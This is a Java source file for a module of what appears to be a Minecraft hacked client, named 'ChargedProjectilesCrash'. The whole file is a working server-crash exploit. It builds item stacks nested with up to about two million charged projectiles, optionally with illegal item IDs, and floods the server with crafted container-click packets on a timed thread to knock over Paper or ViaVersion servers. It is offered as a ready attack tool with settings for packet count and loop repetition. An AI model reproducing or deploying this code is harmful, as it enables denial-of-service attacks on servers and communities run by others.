package me.madeq.client.module.impl.crash;

import com.viaversion.viafabricplus.ViaFabricPlus;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import me.madeq.client.command.ArgumentType;
import me.madeq.client.module.Module;
import me.madeq.client.module.ModuleContext;
import me.madeq.client.module.ModuleType;
import me.madeq.client.protocol.Protocol;
import me.madeq.client.protocol.components.data.DataComponents;
import me.madeq.client.protocol.components.data.impl.DataChargedProjectiles;
import me.madeq.client.protocol.components.objects.ItemStack;
import me.madeq.client.protocol.packets.PacketCodec;
import me.madeq.client.protocol.packets.play.PacketContainerClick;
import net.minecraft.client.Minecraft;

import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

public class ChargedProjectilesCrash extends Module {
    public ChargedProjectilesCrash() {
        super("ChargedProjectiles", "Basic DataComponent Bomb Crasher (Paper and ViaVersion/ViaBackwards Abuser)", ModuleType.CRASHER);
        addArgument("packets", ArgumentType.INT, 1, 1000, "100");
        addArgument("size 1", ArgumentType.INT, 1, 2096000, "2096000");
        addArgument("size 2", ArgumentType.INT, 1, 2096000, "1");
        addArgument("isIllegal", ArgumentType.BOOLEAN);
        addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1");
        addArgument("loopAmount", ArgumentType.INT, 1, 30, "1");
    }

    private ScheduledExecutorService executorService;

    @Override
    public void executeModule(ModuleContext context) {
        int packets = context.getInt("packets");
        int chargedProjectiles1 = context.getInt("size 1");
        int chargedProjectiles2 = context.getInt("size 2");
        boolean isIllegal = context.getBoolean("isIllegal");
        int threadSleep = context.getInt("threadSleep");
        int loopAmount = context.getInt("loopAmount");

        setEnabled(true);

        if (executorService != null && !executorService.isShutdown()) {
            executorService.shutdownNow();
            context.sendMessage("Previous attack <red>stopped<white>!");
        }

        if (Protocol.SUPPORTED_PROTOCOLS.contains(ViaFabricPlus.getImpl().getTargetVersion().getVersion())) {
            ItemStack stack1;
            {
                List<ItemStack> chargedProjectiles = new ArrayList<>(chargedProjectiles1);
                ItemStack chargedProjectile = new ItemStack(isIllegal ? -1 : 1, 1, null);

                for (int i = 0; i < chargedProjectiles1; ++i) chargedProjectiles.add(chargedProjectile);

                DataComponents components = new DataComponents();
                components.put(new DataChargedProjectiles(chargedProjectiles));

                stack1 = new ItemStack(isIllegal ? -1 : 1233, 1, components);
            }

            ItemStack stack2;
            {
                List<ItemStack> chargedProjectiles = new ArrayList<>(chargedProjectiles2);

                for (int i = 0; i < chargedProjectiles2; ++i) chargedProjectiles.add(stack1);

                DataComponents components = new DataComponents();
                components.put(new DataChargedProjectiles(chargedProjectiles));

                stack2 = new ItemStack(isIllegal ? -1 : 1233, 1, components);
            }

            context.sendMessage("Start crashing with method: <aqua>" + getName() + "<white>!");

            AtomicInteger check = new AtomicInteger(0);
            executorService = Executors.newSingleThreadScheduledExecutor();
            Runnable clickTask = () -> {
                if (!isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount || (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
                    executorService.shutdown();
                    setEnabled(false);
                    if (Minecraft.getInstance().getConnection() != null) {
                        context.sendMessage("Attack <green>successful <white>finished!");
                    }
                } else {
                    PacketCodec.sendPacket(new PacketContainerClick(
                                    ViaFabricPlus.getImpl().getTargetVersion().getVersion(),
                                    0,
                                    1,
                                    10,
                                    PacketContainerClick.ContainerActionType.CLICK_ITEM,
                                    PacketContainerClick.ContainerAction.RIGHT_CLICK,
                                    stack2,
                                    new Int2ObjectOpenHashMap<>()),
                            packets);
                }

                check.getAndIncrement();
            };
            executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);

        } else {
            context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
        }
    }

    @Override
    public void onDisconnect() {
        super.onDisconnect();
        if (executorService != null) {
            executorService.shutdownNow();
        }
    }
}
